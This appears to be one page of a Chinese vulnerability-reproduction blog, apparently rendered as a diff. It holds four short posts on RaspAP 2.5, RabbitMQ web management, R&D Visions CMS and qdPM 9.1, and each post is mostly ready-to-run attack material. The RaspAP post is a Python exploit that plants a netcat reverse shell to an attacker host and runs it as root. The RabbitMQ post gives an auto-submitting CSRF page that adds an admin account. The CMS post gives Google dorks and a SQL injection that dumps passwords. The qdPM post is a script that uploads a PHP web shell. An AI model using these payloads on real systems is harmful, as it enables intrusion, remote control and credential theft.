+    <a href="/2022/07/07/RaspAP/%EF%BC%88CVE-2020-24572%EF%BC%89RaspAP%202.5%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.172Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-24572）RaspAP-2-5-远程命令执行漏洞"><a href="#（CVE-2020-24572）RaspAP-2-5-远程命令执行漏洞" class="headerlink" title="（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞"></a>（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在RaspAP<br>2.5的<code>include/webconsole.php</code>中发现了一个问题。借助经过身份验证的访问，攻击者可以使用配置错误（并且实际上不受限制）的Web控制台攻击运行该软件的底层OS（Raspberry<br>Pi），并在系统上执行命令（包括用于上传文件和执行代码的命令）。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>RaspAP 2.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>CVE-2020-24572.py</p>
+</blockquote>
+<p><img src="/resource/(CVE-2020-24572)RaspAP2.5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"><img src="/resource/(CVE-2020-24572)RaspAP2.5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="2.png"></p>
+<pre><code>#/usr/bin/python3
+
+#####################################################
+##############       deadb0x.io        ##############
+#####################################################
+###      Proof of Concept for CVE-2020-24572      ###
+###     (Authenticated) Remote Code Execution     ###
+###             via Webconsole.php in             ###
+###                  RaspAP v2.5                  ###
+###         github.com/billz/raspap-webgui        ###
+###         github.com/nickola/web-console        ###
+#####################################################
+### Written by: lunchb0x - Disc. Date: 08/24/2020 ###
+#####################################################
+###       deadb0x.io/lunchb0x/CVE-2020-24572      ###
+###         github.com/lb0x/CVE-2020-24572        ###
+#####################################################
+
+import os
+import sys
+import requests
+from termcolor import colored
+
+if len(sys.argv) != 6:
+    print(&quot;---------------------------------------------------------------------------------------&quot;)
+    print(&quot;USAGE: rasp_pwn.py [target_ip] [port] [attacker_ip] [attacker_port] [RaspAP_admin_pass]&quot;)
+    print(&quot;---------------------------------------------------------------------------------------&quot;)
+    exit(1)
+
+target = sys.argv[1]
+port = sys.argv[2]
+listener_ip = sys.argv[3]
+listener_port = sys.argv[4]
+raspap_user = &quot;admin&quot;
+raspap_pass = sys.argv[5]
+
+session = requests.Session()
+session.auth = (raspap_user, raspap_pass)
+
+
+json_req_1 = &#123;
+              &quot;jsonrpc&quot;:&quot;2.0&quot;,
+              &quot;method&quot;:&quot;run&quot;,
+              &quot;params&quot;:[&quot;NO_LOGIN&quot;,
+                        &#123;&quot;user&quot;:&quot;&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;path&quot;:&quot;&quot;&#125;,
+                        &quot;echo &#39;touch \/tmp\/f;rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/bash -i 2&gt;&amp;1|nc %s %d &gt;\/tmp\/f&#39; &gt;&gt; \/etc\/raspap\/lighttpd\/configport.sh&quot;%(listener_ip, listener_port)
+                        ],
+              &quot;id&quot;:6
+              &#125;
+
+json_req_2 = &#123;
+              &quot;jsonrpc&quot;:&quot;2.0&quot;,
+              &quot;method&quot;:&quot;run&quot;,
+              &quot;params&quot;:[&quot;NO_LOGIN&quot;,
+                        &#123;&quot;user&quot;:&quot;&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;path&quot;:&quot;&quot;&#125;,
+                        &quot;sudo /etc/raspap/lighttpd/configport.sh&quot;
+                        ],
+              &quot;id&quot;:6
+              &#125;
+
+r = session.post(&quot;http://%s:%s/includes/webconsole.php&quot;%(target,port), json=json_req_1)
+print(colored(&quot;[!]&quot;, &#39;green&#39;) + &quot; Reverse shell injected&quot;)
+print(colored(&quot;[!]&quot;, &#39;yellow&#39;) + &quot; Sending activation request - Make sure your listener is running . . .&quot;)
+os.system(&quot;stty -echo&quot;)
+input(colored(&quot;[&gt;&gt;&gt;]&quot;, &#39;green&#39;)+&quot; Press ENTER to continue . . .&quot;)
+os.system(&quot;stty echo&quot;)
+print(colored(&quot;\n[!]&quot;, &#39;green&#39;) + &quot; You should be root :)&quot;)
+
+r = session.post(&quot;http://%s:%s/includes/webconsole.php&quot;%(target,port), json=json_req_2)
+print(colored(&quot;[*]&quot;, &#39;green&#39;) + &quot; Done.&quot;)
+
+
+print(colored(&quot;----------------&quot;, &#39;yellow&#39;))
+print(colored(&quot;[] deadb0x.io&quot;, &#39;yellow&#39;))
+print(colored(&quot;----------------&quot;, &#39;yellow&#39;))
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/RaspAP/%EF%BC%88CVE-2020-24572%EF%BC%89RaspAP%202.5%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/RaspAP/%EF%BC%88CVE-2020-24572%EF%BC%89RaspAP%202.5%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv7000fjy8v17rm323nh" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-RabbitMQ/RabbitMQ Web管理csrf漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/RabbitMQ/RabbitMQ%20Web%E7%AE%A1%E7%90%86csrf%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.167Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="RabbitMQ-Web管理csrf漏洞"><a href="#RabbitMQ-Web管理csrf漏洞" class="headerlink" title="RabbitMQ Web管理csrf漏洞"></a>RabbitMQ Web管理csrf漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>RabbitMQ Web Management &lt; 3.7.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>&lt;html&gt; 
+&lt;h2&gt;Add RabbitMQ Admin&lt;/h2&gt;
+&lt;body&gt;
+&lt;form name=&quot;rabbit&quot; id=&quot;rabbit&quot; action=&quot;https://www.0-sec.org/api/users/rootadmin&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;rootadmin&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;rootadmin&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tags&quot; value=&quot;administrator&quot; /&gt;
+&lt;input type=&quot;submit&quot;  value=&quot;save&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  window.onload = rabbit.submit()
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/RabbitMQ/RabbitMQ%20Web%E7%AE%A1%E7%90%86csrf%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/RabbitMQ/RabbitMQ%20Web%E7%AE%A1%E7%90%86csrf%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qv1u00fby8v143gz5zc3" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-R&amp;D Visions CMS/R&amp;D Visions CMS  SQL Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/R&D%20Visions%20CMS/R&D%20Visions%20CMS%20%20SQL%20Injection/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.161Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="R-amp-D-Visions-CMS-SQL-Injection"><a href="#R-amp-D-Visions-CMS-SQL-Injection" class="headerlink" title="R&amp;D Visions CMS SQL Injection"></a>R&amp;D Visions CMS SQL Injection</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>Google Dork:</p>
+<pre><code>intext:&quot;Website by R&amp;D Visions&quot; inurl:.php?id=
+
+intext:&quot;CMS System by R&amp;D Visions&quot;
+</code></pre>
+<p>Demo:</p>
+<pre><code>https://www.0-sec.org/home.php?newid=53[SQLi]
+</code></pre>
+<p>Injection:</p>
+<pre><code>https://www.0-sec.org/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log--
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/R&D%20Visions%20CMS/R&D%20Visions%20CMS%20%20SQL%20Injection/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/R&D%20Visions%20CMS/R&D%20Visions%20CMS%20%20SQL%20Injection/" data-id="cl5c2qv1t00fay8v1fogc883g" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-QdPM/（CVE-2020-7246）QdPM _9.1 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/QdPM/%EF%BC%88CVE-2020-7246%EF%BC%89QdPM%20_9.1%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.156Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-7246）QdPM-lt-9-1-远程代码执行漏洞"><a href="#（CVE-2020-7246）QdPM-lt-9-1-远程代码执行漏洞" class="headerlink" title="（CVE-2020-7246）QdPM &lt;9.1 远程代码执行漏洞"></a>（CVE-2020-7246）QdPM &lt;9.1 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>python CVE-2020-7246.py -url <a target="_blank" rel="noopener" href="https://www.0-sec.org/">https://www.0-sec.org/</a> -u 用户名 -p密码</strong></p>
+<pre><code># Exploit Title: qdPM 9.1 - Remote Code Execution
+# Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net
+# Date: 2020-01-22
+# Exploit Author: Rishal Dwivedi (Loginsoft)
+# Vendor Homepage: http://qdpm.net/
+# Software Link: http://qdpm.net/download-qdpm-free-project-management
+# Version: &lt;=1.9.1
+# Tested on: Windows 10 (Python 2.7)
+# CVE : CVE-2020-7246
+# Exploit written in Python 2.7
+# Tested Environment - Windows 10
+# Path Traversal + Remote Code Execution
+
+# Command - qdpm-exploit.py -url http://localhost/ -u user@localhost.com -p password
+# -*- coding: utf-8 -*-
+#!/usr/bin/python
+
+import requests
+from lxml import html
+from argparse import ArgumentParser
+
+session_requests = requests.session()
+
+def multifrm(
+    userid,
+    username,
+    csrftoken_,
+    EMAIL,
+    HOSTNAME,
+    uservar,
+    ):
+    request_1 = &#123;
+        &#39;sf_method&#39;: (None, &#39;put&#39;),
+        &#39;users[id]&#39;: (None, userid[-1]),
+        &#39;users[photo_preview]&#39;: (None, uservar),
+        &#39;users[_csrf_token]&#39;: (None, csrftoken_[-1]),
+        &#39;users[name]&#39;: (None, username[-1]),
+        &#39;users[new_password]&#39;: (None, &#39;&#39;),
+        &#39;users[email]&#39;: (None, EMAIL),
+        &#39;extra_fields[9]&#39;: (None, &#39;&#39;),
+        &#39;users[remove_photo]&#39;: (None, &#39;1&#39;),
+        &#125;
+    return request_1
+
+
+def req(
+    userid,
+    username,
+    csrftoken_,
+    EMAIL,
+    HOSTNAME,
+    ):
+    request_1 = multifrm(
+        userid,
+        username,
+        csrftoken_,
+        EMAIL,
+        HOSTNAME,
+        &#39;.htaccess&#39;,
+        )
+    new = session_requests.post(HOSTNAME + &#39;index.php/myAccount/update&#39;
+                                , files=request_1)
+    request_2 = multifrm(
+        userid,
+        username,
+        csrftoken_,
+        EMAIL,
+        HOSTNAME,
+        &#39;../.htaccess&#39;,
+        )
+    new1 = session_requests.post(HOSTNAME + &#39;index.php/myAccount/update&#39;
+                                 , files=request_2)
+    request_3 = &#123;
+        &#39;sf_method&#39;: (None, &#39;put&#39;),
+        &#39;users[id]&#39;: (None, userid[-1]),
+        &#39;users[photo_preview]&#39;: (None, &#39;&#39;),
+        &#39;users[_csrf_token]&#39;: (None, csrftoken_[-1]),
+        &#39;users[name]&#39;: (None, username[-1]),
+        &#39;users[new_password]&#39;: (None, &#39;&#39;),
+        &#39;users[email]&#39;: (None, EMAIL),
+        &#39;extra_fields[9]&#39;: (None, &#39;&#39;),
+        &#39;users[photo]&#39;: (&#39;backdoor.php&#39;,
+                         &#39;&lt;?php if(isset($_REQUEST[\&#39;cmd\&#39;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[\&#39;cmd\&#39;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;&#39;
+                         , &#39;application/octet-stream&#39;),
+        &#125;
+    upload_req = session_requests.post(HOSTNAME
+            + &#39;index.php/myAccount/update&#39;, files=request_3)
+
+
+def main(HOSTNAME, EMAIL, PASSWORD):
+    result = session_requests.get(HOSTNAME + &#39;/index.php/login&#39;)
+    login_tree = html.fromstring(result.text)
+    authenticity_token =             list(set(login_tree.xpath(&quot;//input[@name=&#39;login[_csrf_token]&#39;]/@value&quot;
+             )))[0]
+    payload = &#123;&#39;login[email]&#39;: EMAIL, &#39;login[password]&#39;: PASSWORD,
+               &#39;login[_csrf_token]&#39;: authenticity_token&#125;
+    result = session_requests.post(HOSTNAME + &#39;/index.php/login&#39;,
+                                   data=payload,
+                                   headers=dict(referer=HOSTNAME
+                                   + &#39;/index.php/login&#39;))
+    account_page = session_requests.get(HOSTNAME + &#39;index.php/myAccount&#39;
+            )
+    account_tree = html.fromstring(account_page.content)
+    userid = account_tree.xpath(&quot;//input[@name=&#39;users[id]&#39;]/@value&quot;)
+    username = account_tree.xpath(&quot;//input[@name=&#39;users[name]&#39;]/@value&quot;)
+    csrftoken_ =             account_tree.xpath(&quot;//input[@name=&#39;users[_csrf_token]&#39;]/@value&quot;)
+    req(userid, username, csrftoken_, EMAIL, HOSTNAME)
+    get_file = session_requests.get(HOSTNAME + &#39;index.php/myAccount&#39;)
+    final_tree = html.fromstring(get_file.content)
+    backdoor =             final_tree.xpath(&quot;//input[@name=&#39;users[photo_preview]&#39;]/@value&quot;)
+    print &#39;Backdoor uploaded at - &gt; &#39; + HOSTNAME + &#39;/uploads/users/&#39;             + backdoor[-1] + &#39;?cmd=whoami&#39;
+
+
+if __name__ == &#39;__main__&#39;:
+    parser =             ArgumentParser(description=&#39;qdmp - Path traversal + RCE Exploit&#39;
+                       )
+    parser.add_argument(&#39;-url&#39;, &#39;--host&#39;, dest=&#39;hostname&#39;,
+                        help=&#39;Project URL&#39;)
+    parser.add_argument(&#39;-u&#39;, &#39;--email&#39;, dest=&#39;email&#39;,
+                        help=&#39;User email (Any privilege account)&#39;)
+    parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, dest=&#39;password&#39;,
+                        help=&#39;User password&#39;)
+    args = parser.parse_args()
+
+    main(args.hostname, args.email, args.password)
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/QdPM/%EF%BC%88CVE-2020-7246%EF%BC%89QdPM%20_9.1%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/QdPM/%EF%BC%88CVE-2020-7246%EF%BC%89QdPM%20_9.1%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quys00f6y8v1gs8b3qbh" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/45/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/44/">44</a><a class="page-number" href="/page/45/">45</a><span class="page-number current">46</span><a class="page-number" href="/page/47/">47</a><a class="page-number" href="/page/48/">48</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/47/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
